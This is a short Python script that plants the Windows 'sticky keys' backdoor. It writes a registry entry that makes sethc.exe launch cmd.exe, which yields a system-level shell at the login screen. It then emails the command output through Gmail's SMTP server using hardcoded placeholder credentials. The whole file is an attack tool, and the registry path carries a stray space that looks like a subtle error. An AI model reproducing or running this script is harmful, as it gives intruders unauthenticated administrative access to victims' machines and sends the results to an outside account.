import subprocess, smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "REG ADD \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe \" /v Debugger /t REG_SZ /d \"C:\windows\system32\cmd.exe\""
result = subprocess.check_output(command, shell=True)
send_mail("abc@gmail.com", "password", result)
